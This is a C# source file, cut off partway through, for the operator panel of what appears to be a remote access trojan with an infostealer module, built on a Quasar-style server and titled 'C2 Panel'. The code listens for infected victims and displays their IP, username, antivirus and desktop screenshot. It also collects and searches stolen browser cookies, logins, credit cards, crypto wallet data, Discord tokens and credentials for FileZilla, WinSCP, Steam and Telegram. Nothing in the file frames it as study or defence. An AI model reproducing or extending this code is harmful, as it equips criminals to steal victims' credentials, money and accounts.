

using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Forms.Layout;
using ComponentFactory.Krypton.Toolkit;
using InvokedCommon.Enums;
using InvokedCommon.Messages;
using InvokedCommon.Structs;
using InvokedServer.DataStructs;
using InvokedServer.Extensions;
using InvokedServer.Messages;
using InvokedServer.Networking;
using InvokedServer.Properties;
using InvokedServer.Utilities;


namespace InvokedServer.Forms
{
	public partial class FrmMain : KryptonForm
	{
		private readonly object _stealerSyncLock = new object();
		private const int STATUS_ID = 4;
		private const int USERSTATUS_ID = 5;
		private Client currentlySelectedClient;
		private bool _processingClientConnections;
		private readonly ClientStatusHandler _clientStatusHandler;
		private readonly StealerHandler _stealerHandler;
		private readonly ClientInfoSummaryHandler _clientInfoSummaryHandler;
		private readonly Queue<KeyValuePair<Client, bool>> _clientConnections = new Queue<KeyValuePair<Client, bool>>();
		private readonly object _processingClientConnectionsLock = new object();
		private readonly object _lockClients = new object();
		public static Assembly assembly = Assembly.GetExecutingAssembly();
		public static FileVersionInfo fvi = FileVersionInfo.GetVersionInfo(FrmMain.assembly.Location);
		public static string version = FrmMain.fvi.FileVersion;
		private static string titleName = "C2 Panel";
		private System.Windows.Forms.Timer _titleTimer;
		private string _baseTitle;
		private int _scrollIndex;
		private Stopwatch _stopwatch;
		private double _scrollSpeed = 50.0;
		private bool _animiatingActive;

		public QuasarServer ListenServer { get; set; }

		public FrmMain()
		{
			this._clientStatusHandler = new ClientStatusHandler();
			this._stealerHandler = new StealerHandler();
			this._clientInfoSummaryHandler = new ClientInfoSummaryHandler();
			this.RegisterMessageHandler();
			this.InitializeComponent();
			AppDomain.CurrentDomain.ProcessExit += (EventHandler)((s, e) =>
			{
				if (this.notifyIcon == null)
					return;
				this.notifyIcon.Visible = false;
				this.notifyIcon.Dispose();
			});
		}

		private void RegisterMessageHandler()
		{
			MessageHandler.Register(this._clientStatusHandler);
			this._clientStatusHandler.StatusUpdated += new ClientStatusHandler.StatusUpdatedEventHandler(this.SetStatusByClient);
			this._clientStatusHandler.UserStatusUpdated += new ClientStatusHandler.UserStatusUpdatedEventHandler(this.SetUserStatusByClient);
			MessageHandler.Register(this._stealerHandler);
			this._stealerHandler.NewEventLog += new StealerHandler.EventLogHandler(this.AddLogByClient);
			this._stealerHandler.NewStealerLog += new StealerHandler.StealerLogHandler(this.AddStealerLog);
			this._stealerHandler.NewLog += new StealerHandler.LogHandler(this.HandlerAddEventLog);
			MessageHandler.Register(this._clientInfoSummaryHandler);
			this._clientInfoSummaryHandler.NewSystemInfoSummary += new ClientInfoSummaryHandler.SummaryInfoHandler(this.PopulateClientInfoPanelDetails);
			this._clientInfoSummaryHandler.NewSystemInfoImage += new ClientInfoSummaryHandler.SummaryInfoImageHandler(this.PopulateClientInfoPanelImage);
			this._clientInfoSummaryHandler.NewPluginLoaded += new ClientInfoSummaryHandler.PluginLoadedHandler(this.LogNewPluginLoaded);
		}

		private void UnregisterMessageHandler()
		{
			MessageHandler.Unregister(this._clientStatusHandler);
			this._clientStatusHandler.StatusUpdated -= new ClientStatusHandler.StatusUpdatedEventHandler(this.SetStatusByClient);
			this._clientStatusHandler.UserStatusUpdated -= new ClientStatusHandler.UserStatusUpdatedEventHandler(this.SetUserStatusByClient);
			MessageHandler.Unregister(this._stealerHandler);
			this._stealerHandler.NewEventLog -= new StealerHandler.EventLogHandler(this.AddLogByClient);
			this._stealerHandler.NewStealerLog -= new StealerHandler.StealerLogHandler(this.AddStealerLog);
			this._stealerHandler.NewLog -= new StealerHandler.LogHandler(this.HandlerAddEventLog);
			MessageHandler.Register(this._clientInfoSummaryHandler);
			this._clientInfoSummaryHandler.NewSystemInfoSummary -= new ClientInfoSummaryHandler.SummaryInfoHandler(this.PopulateClientInfoPanelDetails);
			this._clientInfoSummaryHandler.NewSystemInfoImage -= new ClientInfoSummaryHandler.SummaryInfoImageHandler(this.PopulateClientInfoPanelImage);
			this._clientInfoSummaryHandler.NewPluginLoaded -= new ClientInfoSummaryHandler.PluginLoadedHandler(this.LogNewPluginLoaded);
		}

		private bool is64Bitness() => Marshal.SizeOf(typeof(IntPtr)) == 8;

		public void UpdateClientNumber()
		{
			try
			{
				this.Invoke((MethodInvoker)(() =>
				{
					int length = this.ListenServer.ConnectedClients.Length;
					this.ClientsToolStripStatusLabel.Text = "Online: " + length.ToString();
					if (length > 0)
					{
						this.TabsControl.Pages["ClientsPage"].Text = "Clients (" + length.ToString() + ")";
						this.ClientsToolStripStatusLabel.Image = Resources.status_online_blue;
					}
					else
					{
						this.TabsControl.Pages["ClientsPage"].Text = "Clients";
						this.ClientsToolStripStatusLabel.Image = Resources.status_offline;
					}
					Client[] selectedClients = this.GetSelectedClients();
					int count = this.ClientsDataGridView.SelectedRows.Count;
					string str = "";
					foreach (Client client in selectedClients)
						str = str + " " + client.Value.PcName + "/" + client.Value.Username;
					if (count > 1)
					{
						this.SelectedClienttoolStripStatusLabel.Text = "Selected: [" + count.ToString() + "]";
						this.SelectedClienttoolStripStatusLabel.Image = Resources.selection_select;
					}
					else if (count < 1)
					{
						this.SelectedClienttoolStripStatusLabel.Text = "Selected:";
						this.SelectedClienttoolStripStatusLabel.Image = Resources.selection;
						this.clientInfoPanel.Visible = false;
					}
					else
					{
						this.SelectedClienttoolStripStatusLabel.Text = "Selected:" + str;
						this.SelectedClienttoolStripStatusLabel.Image = Resources.selection_select;
						Client client = selectedClients.First();
						if (client.Connected && (client != this.currentlySelectedClient || !this.clientInfoPanel.Visible))
						{
							this.PopulateClientInfoPanel(client);
							this.clientInfoPanel.Visible = true;
						}
						this.currentlySelectedClient = client;
					}
				}));
			}
			catch
			{
			}
		}

		private void LogNewPluginLoaded(object sender, Client client, string PluginName)
		{
			this.AddEventLog(PluginName + " Plugin Module Loaded [" + client.Value.UserAtPc + "]", '*');
		}

		private void clientNetworkInfoListView_ItemClicked(object sender, KeyEventArgs e)
		{
			if (!e.Control || e.KeyCode != Keys.C)
				return;
			ListView.SelectedListViewItemCollection selectedItems = this.clientNetworkInfoListView.SelectedItems;
			string text = "";
			foreach (ListViewItem listViewItem in selectedItems)
			{
				text += listViewItem.SubItems[1].Text;
				if (selectedItems.Count > 1)
					text += Environment.NewLine;
			}
			Clipboard.SetText(text);
		}

		private void clientDetailedInfoListView_ItemClicked(object sender, KeyEventArgs e)
		{
			if (!e.Control || e.KeyCode != Keys.C)
				return;
			ListView.SelectedListViewItemCollection selectedItems = this.clientDetailedInfoListView.SelectedItems;
			string text = "";
			foreach (ListViewItem listViewItem in selectedItems)
			{
				text += listViewItem.SubItems[1].Text;
				if (selectedItems.Count > 1)
					text += Environment.NewLine;
			}
			Clipboard.SetText(text);
		}

		private void clientInfoCountryListView_ItemClicked(object sender, KeyEventArgs e)
		{
			if (!e.Control || e.KeyCode != Keys.C)
				return;
			ListView.SelectedListViewItemCollection selectedItems = this.clientInfoCountryListView.SelectedItems;
			string text = "";
			foreach (ListViewItem listViewItem in selectedItems)
			{
				text += listViewItem.SubItems[1].Text;
				if (selectedItems.Count > 1)
					text += Environment.NewLine;
			}
			Clipboard.SetText(text);
		}

		private void PopulateClientInfoPanelImage(object sender, Client client, Bitmap DesktopPreview)
		{
			if (this.clientNetworkInfoListView.Tag != (object)client.Value.Tag)
				return;
			this.clientInfoPictureBox.Image = (Image)DesktopPreview.Clone();
		}

		private void PopulateClientInfoPanelDetails(
		  object sender,
		  Client client,
		  List<Tuple<string, string>> lstInfos)
		{
			this.clientDetailedInfoListView.Items.Clear();
			if (this.clientNetworkInfoListView.Tag != (object)client.Value.Tag)
				return;
			foreach (Tuple<string, string> lstInfo in lstInfos)
			{
				ListViewItem listViewItem = new ListViewItem(new string[2]
				{
		  lstInfo.Item1,
		  lstInfo.Item2
				});
				if (lstInfo.Item1 == "OS:")
					listViewItem.ImageKey = "drive_cd_empty.png";
				else if (lstInfo.Item1 == "CPU:")
					listViewItem.ImageKey = "counter.png";
				else if (lstInfo.Item1 == "GPU:")
					listViewItem.ImageKey = "counter_count.png";
				else if (lstInfo.Item1 == "Memory:")
					listViewItem.ImageKey = "ddr_memory.png";
				else if (lstInfo.Item1 == "Uptime:")
					listViewItem.ImageKey = "system_monitor.png";
				else if (lstInfo.Item1 == "Idle Time:")
					listViewItem.ImageKey = "wait.png";
				else if (lstInfo.Item1 == "Window:")
					listViewItem.ImageKey = "shape_group2.png";
				else if (lstInfo.Item1 == "Antivirus:")
					listViewItem.ImageKey = "shield.png";
				else if (lstInfo.Item1 == "HWID:")
					listViewItem.ImageKey = "star_1.png";
				this.clientDetailedInfoListView.Items.Add(listViewItem);
			}
			this.clientDetailedInfoListView.AutosizeColumns();
		}

		private void PopulateClientInfoPanel(Client client)
		{
			this.clientNetworkInfoListView.Items.Clear();
			this.clientInfoCountryListView.Items.Clear();
			this.clientDetailedInfoListView.Items.Clear();
			this.clientInfoPictureBox.Image = Resources.LoadingV2;
			this.clientNetworkInfoListView.Tag = (object)client.Value.Tag;
			if (int.Parse(client.Value.Version.Replace(".", "")) >= 178)
				client.Send<GetSystemSummaryInfo>(new GetSystemSummaryInfo());
			this.clientInfoCountryListView.Items.Add(new ListViewItem(new string[2]
			{
				"Country:",
				client.Value.Country
			})
			{
				ImageIndex = client.Value.ImageIndex
			});
			this.clientNetworkInfoListView.Items.Add(new ListViewItem(new string[2]
			{
				"IP Address:",
				client.EndPoint.Address.ToString()
			})
			{
				ImageKey = "flag_blue.png"
			});
			this.clientNetworkInfoListView.Items.Add(new ListViewItem(new string[2]
			{
				"User:",
				client.Value.Username
			})
			{
				ImageKey = "status_online_blue.png"
			});
			this.clientNetworkInfoListView.Items.Add(new ListViewItem(new string[2]
			{
				"PC Name:",
				client.Value.PcName
			})
			{
				ImageKey = "server.png"
			});
			this.clientNetworkInfoListView.Items.Add(new ListViewItem(new string[2]
			{
				"Version:",
				client.Value.Version
			})
			{
				ImageKey = "shape_align_left.png"
			});
			this.clientNetworkInfoListView.Items.Add(new ListViewItem(new string[2]
			{
				"Tag:",
				client.Value.Tag
			})
			{
				ImageKey = "switch.png"
			});
		}

		private void SetTitle(string text = "isChanged")
		{
			string str = "x32";
			if (this.is64Bitness())
				str = "x64";
			if (text != "isChanged")
				this.Text = text + " | " + str + " | v" + FrmMain.version;
			else
				this.Text = FrmMain.titleName + " | " + str + " | v" + FrmMain.version;
		}

		private void InitializeServer()
		{
			if (InvokedServer.Models.Settings.GetCustomName != "")
			{
				this.SetTitle(InvokedServer.Models.Settings.GetCustomName);
			}
			else
			{
				int num = (int)MessageBox.Show(InvokedServer.Models.Settings.GetCustomName);
				this.SetTitle();
			}
			if (!File.Exists(InvokedServer.Models.Settings.CertificatePath))
			{
				using (FrmCertificate frmCertificate = new FrmCertificate())
				{
					while (frmCertificate.ShowDialog() != DialogResult.OK)
					{
						Thread.Sleep(100);
					}
				}
			}
			this.ListenServer = new QuasarServer(new X509Certificate2(InvokedServer.Models.Settings.CertificatePath));
			this.ListenServer.ServerState += new Server.ServerStateEventHandler(this.ServerState);
			this.ListenServer.ClientConnected += new QuasarServer.ClientConnectedEventHandler(this.ClientConnected);
			this.ListenServer.ClientDisconnected += new QuasarServer.ClientDisconnectedEventHandler(this.ClientDisconnected);
		}

		private void StartConnectionListener()
		{
			try
			{
				this.ListenServer.Listen(InvokedServer.Models.Settings.ListenPort, InvokedServer.Models.Settings.IPv6Support, InvokedServer.Models.Settings.UseUPnP);
			}
			catch (SocketException ex)
			{
				if (ex.ErrorCode == 10048)
				{
					int num1 = (int)MessageBox.Show(this, "The port is already in use.", "Socket Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
				else
				{
					int num2 = (int)MessageBox.Show(this, string.Format("An unexpected socket error occurred: {0}\n\nError Code: {1}\n\n", (object)ex.Message, (object)ex.ErrorCode), "Unexpected Socket Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
				this.ListenServer.Disconnect();
			}
			catch
			{
				this.ListenServer.Disconnect();
			}
		}

		private void AutostartListening()
		{
			if (InvokedServer.Models.Settings.AutoListen)
				this.StartConnectionListener();
			if (!InvokedServer.Models.Settings.EnableNoIPUpdater)
				return;
			NoIpUpdater.Start();
		}

		private void FrmMain_Load(object sender, EventArgs e)
		{
			this.InitializeServer();
			this.AutostartListening();
		}

		private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
		{
			this.ListenServer.Disconnect();
			this.UnregisterMessageHandler();
			this.notifyIcon.Visible = false;
			this.notifyIcon.Dispose();
		}

		private void ClientsDataGridView_SelectedIndexChanged(object sender, EventArgs e)
		{
			this.UpdateClientNumber();
		}

		private void ServerState(Server server, bool listening, ushort port)
		{
			try
			{
				this.Invoke((MethodInvoker)(() =>
                {
					if (!listening)
					{
						this.ClientsDataGridView.Rows.Clear();
						this.listenToolStripStatusLabel.Text = "Listener: Not Active";
						this.listenToolStripStatusLabel.Image = Resources.asterisk_grey;
					}
					else
					{
						this.listenToolStripStatusLabel.Text = "Listening on Port: " + port.ToString();
						this.listenToolStripStatusLabel.Image = Resources.asterisk_orange;
					}
				}));
				this.UpdateClientNumber();
			}
			catch (InvalidOperationException)
			{
			}
		}

		private void ClientConnected(Client client)
		{
			lock (this._clientConnections)
			{
				if (!this.ListenServer.Listening)
					return;
				this._clientConnections.Enqueue(new KeyValuePair<Client, bool>(client, true));
			}
			lock (this._processingClientConnectionsLock)
			{
				if (this._processingClientConnections)
					return;
				this._processingClientConnections = true;
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.ProcessClientConnections));
			}
		}

		private void ClientDisconnected(Client client)
		{
			lock (this._clientConnections)
			{
				if (!this.ListenServer.Listening)
					return;
				this._clientConnections.Enqueue(new KeyValuePair<Client, bool>(client, false));
			}
			lock (this._processingClientConnectionsLock)
			{
				if (this._processingClientConnections)
					return;
				this._processingClientConnections = true;
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.ProcessClientConnections));
				this.AddEventLog("Client Disconnnected [" + client.Value.UserAtPc + "]", '-');
			}
		}

        private void ProcessClientConnections(object state)
        {
            for (; ; )
            {
                Queue<KeyValuePair<Client, bool>> clientConnections = this._clientConnections;
                KeyValuePair<Client, bool> keyValuePair;
                lock (clientConnections)
                {
                    if (!this.ListenServer.Listening)
                    {
                        this._clientConnections.Clear();
                    }
                    if (this._clientConnections.Count == 0)
                    {
                        object processingClientConnectionsLock = this._processingClientConnectionsLock;
                        lock (processingClientConnectionsLock)
                        {
                            this._processingClientConnections = false;
                            break;
                        }
                    }
                    keyValuePair = this._clientConnections.Dequeue();
                }
                if (keyValuePair.Key != null)
                {
                    if (keyValuePair.Value)
                    {
                        this.AddClientToDataView(keyValuePair.Key);
                        if (InvokedServer.Models.Settings.ShowPopup)
                        {
                            this.ShowPopup(keyValuePair.Key);
                        }
                    }
                    else
                    {
                        this.UpdateClientStatusInListview(keyValuePair.Key, false);
                    }
                }
            }
        }

        public void SetToolTipText(Client client, string text)
		{
			if (client == null)
				return;
			try
			{
				this.ClientsDataGridView.Invoke((MethodInvoker)(() =>
                {
					DataGridViewRow gridViewRowByClient = this.GetDataGridViewRowByClient(client);
					if (gridViewRowByClient == null)
						return;
					gridViewRowByClient.Cells["CountryCol"].ToolTipText = text;
				}));
			}
			catch (InvalidOperationException)
			{
			}
		}

		private void EventLogDataGridView_CellPainting(
		  object sender,
		  DataGridViewCellPaintingEventArgs e)
		{
			if (e.RowIndex == -1 || e.Value == null || e.Value.ToString().Length <= 5 || e.ColumnIndex != 0)
				return;
			if (!e.Handled)
			{
				e.Handled = true;
				e.PaintBackground(e.CellBounds, this.EventLogDataGridView.Rows[e.RowIndex].Cells[e.ColumnIndex].Selected);
			}
			if ((e.PaintParts & DataGridViewPaintParts.ContentForeground) == DataGridViewPaintParts.None)
				return;
			string str1 = e.Value.ToString();
			string str2 = str1.Substring(0, 16);
			string str3 = str1.Substring(16, 3);
			string str4 = str1.Substring(19, str1.Length - 19);
			Font font1 = new Font("Cascadia Code", 8.25f, FontStyle.Regular);
			Font font2 = new Font("Segoe UI", 8.25f, FontStyle.Regular);
			Size size1 = TextRenderer.MeasureText(str2, font2);
			Size size2 = TextRenderer.MeasureText(str3, font1);
			Size size3 = TextRenderer.MeasureText(str4, font2);
			Rectangle layoutRectangle = new Rectangle(e.CellBounds.Location, e.CellBounds.Size);
			e.Graphics.DrawString(str2, font2, Brushes.Gray, (RectangleF)layoutRectangle);
			layoutRectangle.X += size1.Width;
			using (StringFormat format = new StringFormat())
			{
				format.LineAlignment = StringAlignment.Center;
				switch (str3)
				{
					case "[+]":
						e.Graphics.DrawString(str3, font1, Brushes.LightGreen, (RectangleF)layoutRectangle, format);
						break;
					case "[-]":
						e.Graphics.DrawString(str3, font1, Brushes.Red, (RectangleF)layoutRectangle, format);
						break;
					case "[*]":
						e.Graphics.DrawString(str3, font1, Brushes.DeepSkyBlue, (RectangleF)layoutRectangle, format);
						break;
					default:
						e.Graphics.DrawString(str3, font1, Brushes.White, (RectangleF)layoutRectangle, format);
						break;
				}
			}
			layoutRectangle.X += size2.Width;
			using (Brush brush = new SolidBrush(e.CellStyle.ForeColor))
				e.Graphics.DrawString(str4, font2, brush, (RectangleF)layoutRectangle);
			layoutRectangle.X += size3.Width;
		}

		private string FormatNumber(int num)
		{
			if (num >= 1000000)
				return this.FormatNumber(num / 10000) + "M+";
			if (num >= 100000)
				return this.FormatNumber(num / 1000) + "K+";
			return num >= 10000 ? ((double)num / 1000.0).ToString("0.#") + "K+" : num.ToString("#,0");
		}

		private void ClientsDataGridView_onMouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button != MouseButtons.Left || this.ClientsDataGridView.HitTest(e.X, e.Y) != DataGridView.HitTestInfo.Nowhere)
				return;
			this.ClientsDataGridView.ClearSelection();
		}

		private void EventsLogDataGridView_onMouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button != MouseButtons.Left || this.EventLogDataGridView.HitTest(e.X, e.Y) != DataGridView.HitTestInfo.Nowhere)
				return;
			this.EventLogDataGridView.ClearSelection();
		}

		private void StealerSearchClear_Click(object sender, EventArgs e)
		{
			this.StealerSearchTextbox.Clear();
			new Task((() => this.StealerSearchTextbox_TextChanged_Threaded())).Start();
		}

		private void StealerSearchTextbox_TextChanged(object sender, KeyEventArgs e)
		{
			if (e.KeyCode != Keys.Return)
				return;
			new Task((() => this.StealerSearchTextbox_TextChanged_Threaded())).Start();
		}

		private void StealerSearchTextbox_TextChanged_Threaded()
		{
			if (this.StealerSearchTextbox.Text.Length <= 0)
			{
				List<DataGridView> viewsFromControl = this.FindDataGridViewsFromControl(this.StealerTabControl);
				try
				{
					foreach (DataGridView dataGridView in viewsFromControl)
					{
						foreach (DataGridViewRow row1 in dataGridView.Rows)
						{
							DataGridViewRow row = row1;
							if (!row.Visible)
								dataGridView.Invoke((MethodInvoker)(() => row.Visible = true));
						}
					}
				}
				catch
				{
				}
				this.UpdateStealerLogsTitles();
			}
			else
			{
				string lower = this.StealerSearchTextbox.Text.ToLower();
				int checkedCount = 0;
				checkedCount = 0;
				foreach (DataGridViewRow row2 in (IEnumerable)this.StealerCookiesDataGridView.Rows)
				{
					DataGridViewRow row = row2;
					bool rowVisible = false;
					foreach (DataGridViewCell cell in (BaseCollection)row.Cells)
					{
						if (cell.Value != null && cell.Value.ToString().IndexOf(lower, StringComparison.OrdinalIgnoreCase) != -1)
						{
							++checkedCount;
							rowVisible = true;
							break;
						}
					}
					this.StealerCookiesDataGridView.Invoke((MethodInvoker)(() => row.Visible = rowVisible));
				}
				this.StealerTabControl.Invoke((MethodInvoker)(() => this.StealerTabControl.Pages["CookiesPage"].Text = "Cookies (" + this.FormatNumber(checkedCount) + ")"));
				checkedCount = 0;
				foreach (DataGridViewRow row3 in (IEnumerable)this.StealerLoginsDataGridView.Rows)
				{
					DataGridViewRow row = row3;
					bool rowVisible = false;
					foreach (DataGridViewCell cell in (BaseCollection)row.Cells)
					{
						if (cell.Value != null && cell.Value.ToString().IndexOf(lower, StringComparison.OrdinalIgnoreCase) != -1)
						{
							++checkedCount;
							rowVisible = true;
							break;
						}
					}
					this.StealerLoginsDataGridView.Invoke((MethodInvoker)(() => row.Visible = rowVisible));
				}
				this.StealerTabControl.Invoke((MethodInvoker)(() => this.StealerTabControl.Pages["LoginsPage"].Text = "Logins (" + this.FormatNumber(checkedCount) + ")"));
				checkedCount = 0;
				foreach (DataGridViewRow row4 in (IEnumerable)this.StealerAutofillsDataGridView.Rows)
				{
					DataGridViewRow row = row4;
					bool rowVisible = false;
					foreach (DataGridViewCell cell in (BaseCollection)row.Cells)
					{
						if (cell.Value != null && cell.Value.ToString().IndexOf(lower, StringComparison.OrdinalIgnoreCase) != -1)
						{
							++checkedCount;
							rowVisible = true;
							break;
						}
					}
					this.StealerAutofillsDataGridView.Invoke((MethodInvoker)(() => row.Visible = rowVisible));
				}
				this.StealerTabControl.Invoke((MethodInvoker)(() => this.StealerTabControl.Pages["AutofillsPage"].Text = "Autofills (" + this.FormatNumber(checkedCount) + ")"));
				checkedCount = 0;
				foreach (DataGridViewRow row5 in (IEnumerable)this.StealerCardsDataGridView.Rows)
				{
					DataGridViewRow row = row5;
					bool rowVisible = false;
					foreach (DataGridViewCell cell in (BaseCollection)row.Cells)
					{
						if (cell.Value != null && cell.Value.ToString().IndexOf(lower, StringComparison.OrdinalIgnoreCase) != -1)
						{
							++checkedCount;
							rowVisible = true;
							break;
						}
					}
					this.StealerCardsDataGridView.Invoke((MethodInvoker)(() => row.Visible = rowVisible));
				}
				this.StealerTabControl.Invoke((MethodInvoker)(() => this.StealerTabControl.Pages["CardsPage"].Text = "Credit Cards (" + this.FormatNumber(checkedCount) + ")"));
				checkedCount = 0;
				foreach (DataGridViewRow row6 in (IEnumerable)this.StealerCryptoInfoDataGridView.Rows)
				{
					DataGridViewRow row = row6;
					bool rowVisible = false;
					foreach (DataGridViewCell cell in (BaseCollection)row.Cells)
					{
						if (cell.Value != null && cell.Value.ToString().IndexOf(lower, StringComparison.OrdinalIgnoreCase) != -1)
						{
							++checkedCount;
							rowVisible = true;
							break;
						}
					}
					this.StealerCryptoInfoDataGridView.Invoke((MethodInvoker)(() => row.Visible = rowVisible));
				}
				this.StealerTabControl.Invoke((MethodInvoker)(() => this.StealerTabControl.Pages["CryptoinfoPage"].Text = "Crypto Info (" + this.FormatNumber(checkedCount) + ")"));
				checkedCount = 0;
				foreach (DataGridViewRow row7 in (IEnumerable)this.StealerHistoryDataGridView.Rows)
				{
					DataGridViewRow row = row7;
					bool rowVisible = false;
					foreach (DataGridViewCell cell in (BaseCollection)row.Cells)
					{
						if (cell.Value != null && cell.Value.ToString().IndexOf(lower, StringComparison.OrdinalIgnoreCase) != -1)
						{
							++checkedCount;
							rowVisible = true;
							break;
						}
					}
					this.StealerHistoryDataGridView.Invoke((MethodInvoker)(() => row.Visible = rowVisible));
				}
				this.StealerTabControl.Invoke((MethodInvoker)(() => this.StealerTabControl.Pages["HistoryPage"].Text = "History (" + this.FormatNumber(checkedCount) + ")"));
				checkedCount = 0;
				foreach (DataGridViewRow row8 in (IEnumerable)this.StealerDownloadsDataGridView.Rows)
				{
					DataGridViewRow row = row8;
					bool rowVisible = false;
					foreach (DataGridViewCell cell in (BaseCollection)row.Cells)
					{
						if (cell.Value != null && cell.Value.ToString().IndexOf(lower, StringComparison.OrdinalIgnoreCase) != -1)
						{
							++checkedCount;
							rowVisible = true;
							break;
						}
					}
					this.StealerDownloadsDataGridView.Invoke((MethodInvoker)(() => row.Visible = rowVisible));
				}
				this.StealerTabControl.Invoke((MethodInvoker)(() => this.StealerTabControl.Pages["DownloadsPage"].Text = "Downloads (" + this.FormatNumber(checkedCount) + ")"));
				int AppsCheckedCount = 0;
				checkedCount = 0;
				foreach (DataGridViewRow row9 in (IEnumerable)this.StealerTokensDataGridView.Rows)
				{
					DataGridViewRow row = row9;
					bool rowVisible = false;
					foreach (DataGridViewCell cell in (BaseCollection)row.Cells)
					{
						if (cell.Value != null && cell.Value.ToString().IndexOf(lower, StringComparison.OrdinalIgnoreCase) != -1)
						{
							++checkedCount;
							rowVisible = true;
							break;
						}
					}
					this.StealerTokensDataGridView.Invoke((MethodInvoker)(() => row.Visible = rowVisible));
				}
				this.StealerTabControl.Invoke((MethodInvoker)(() => this.StealerAppsTabControl.TabPages["TokensPage"].Text = "Tokens (" + this.FormatNumber(checkedCount) + ")"));
				AppsCheckedCount += checkedCount;
				this.StealerTabControl.Invoke((MethodInvoker)(() => this.StealerTabControl.Pages["AppsPage"].Text = "Apps (" + this.FormatNumber(AppsCheckedCount) + ")"));
				this.StealerAppsTabControl.TabButtonIdleState.ForeColor = Color.LightGoldenrodYellow;
				this.StealerAppsTabControl.TabButtonSelectedState.ForeColor = Color.LightGoldenrodYellow;
			}
		}

		private void ClearAutoSelection(DataGridView DGV)
		{
			if (DGV.RowCount != 1)
				return;
			DGV.ClearSelection();
		}

		private void AddLogByClient(object sender, Client client, string LogType)
		{
			switch (LogType)
			{
				case "DiscordToken":
					this.AddEventLog("Discord Tokens received [" + client.Value.UserAtPc + "]", '*');
					break;
				case "StealerLogFinished":
					this.AddEventLog("Stealer Logs received [" + client.Value.UserAtPc + "]", '*');
					break;
				case "CryptoInfo":
					this.AddEventLog("Crypto Info received [" + client.Value.UserAtPc + "]", '*');
					break;
				case "TelegramInfo":
					this.AddEventLog("Telegram Info received [" + client.Value.UserAtPc + "]", '*');
					break;
				case "SteamInfo":
					this.AddEventLog("Steam Info received [" + client.Value.UserAtPc + "]", '*');
					break;
				case "ObsInfo":
					this.AddEventLog("OBS Info received [" + client.Value.UserAtPc + "]", '*');
					break;
				case "NgrokInfo":
					this.AddEventLog("Ngrok Info received [" + client.Value.UserAtPc + "]", '*');
					break;
				case "FilezillaInfo":
					this.AddEventLog("FileZilla Info received [" + client.Value.UserAtPc + "]", '*');
					break;
				case "FoxmailInfo":
					this.AddEventLog("Foxmail Info received [" + client.Value.UserAtPc + "]", '*');
					break;
				case "WinscpInfo":
					this.AddEventLog("WinSCP Info received [" + client.Value.UserAtPc + "]", '*');
					break;
			}
		}

		public void HandlerAddEventLog(object sender, Client client, string Log)
		{
			this.AddEventLog(Log + "[" + client.Value.UserAtPc + "]", '~');
		}

		public void AddEventLog(string LogText, char Symbol)
		{
			this.EventLogDataGridView.Invoke((MethodInvoker)(() => this.EventLogDataGridView.Rows.Insert(0, new object[1]
			{
		(object) ("[" + DateTime.Now.ToString("dd/MM") + " " + DateTime.Now.ToString("T") + "][" + Symbol.ToString() + "]" + LogText)
			})));
			this.ClearAutoSelection((DataGridView)this.EventLogDataGridView);
		}

		private void AddStealerLog(object sender, Client client, StealerLog stealerLog)
		{
			new Task((() => this.LockAddStealerLogThreaded(client, stealerLog))).Start();
		}

		private void LockAddStealerLogThreaded(Client client, StealerLog data)
		{
			lock (this._stealerSyncLock)
				this.AddStealerLogThreaded(client, data);
		}

		private List<DataGridView> FindDataGridViewsFromControl(Control control)
		{
			List<DataGridView> dataGridViews = new List<DataGridView>();
			RecursiveFindDataGridView(control);
			return dataGridViews;

			DataGridView RecursiveFindDataGridView(Control SubControl)
			{
				if (SubControl is DataGridView)
					dataGridViews.Add((DataGridView)SubControl);
				if (SubControl.HasChildren)
				{
					foreach (Control _control in (ArrangedElementCollection)SubControl.Controls)
						RecursiveFindDataGridView(_control);
				}
				return (DataGridView)null;
			}
		}

		private void UpdateStealerLogsTitles()
		{
			int AutofillLogsCount = this.StealerAutofillsDataGridView.RowCount;
			int LoginsLogsCount = this.StealerLoginsDataGridView.RowCount;
			int CookiesLogsCount = this.StealerCookiesDataGridView.RowCount;
			int CardsLogsCount = this.StealerCardsDataGridView.RowCount;
			int CryptoInfoLogsCount = this.StealerCryptoInfoDataGridView.RowCount;
			int HistoryLogsCount = this.StealerHistoryDataGridView.RowCount;
			int DownloadsLogsCount = this.StealerDownloadsDataGridView.RowCount;
			int TokensLogsCount = this.StealerTokensDataGridView.RowCount;
			int TotalAppsCount = TokensLogsCount;
			int TotalLogsCount = AutofillLogsCount + LoginsLogsCount + CookiesLogsCount + CardsLogsCount + CryptoInfoLogsCount + HistoryLogsCount + DownloadsLogsCount + TotalAppsCount;
			this.StealerTabControl.Invoke((MethodInvoker)(() =>
			{
				if (AutofillLogsCount > 0)
					this.StealerTabControl.Pages["AutofillsPage"].Text = "Autofills (" + this.FormatNumber(AutofillLogsCount) + ")";
				else
					this.StealerTabControl.Pages["AutofillsPage"].Text = "Autofills";
			}));
			this.StealerTabControl.Invoke((MethodInvoker)(() =>
			{
				if (LoginsLogsCount > 0)
					this.StealerTabControl.Pages["LoginsPage"].Text = "Logins (" + this.FormatNumber(LoginsLogsCount) + ")";
				else
					this.StealerTabControl.Pages["LoginsPage"].Text = "Logins";
			}));
			this.StealerTabControl.Invoke((MethodInvoker)(() =>
			{
				if (CookiesLogsCount > 0)
					this.StealerTabControl.Pages["CookiesPage"].Text = "Cookies (" + this.FormatNumber(CookiesLogsCount) + ")";
				else
					this.StealerTabControl.Pages["CookiesPage"].Text = "Cookies";
			}));
			this.StealerTabControl.Invoke((MethodInvoker)(() =>
			{
				if (CardsLogsCount > 0)
					this.StealerTabControl.Pages["CardsPage"].Text = "Credit Cards (" + this.FormatNumber(CardsLogsCount) + ")";
				else
					this.StealerTabControl.Pages["CardsPage"].Text = "Credit Cards";
			}));
			this.StealerTabControl.Invoke((MethodInvoker)(() =>
			{
				if (CryptoInfoLogsCount > 0)
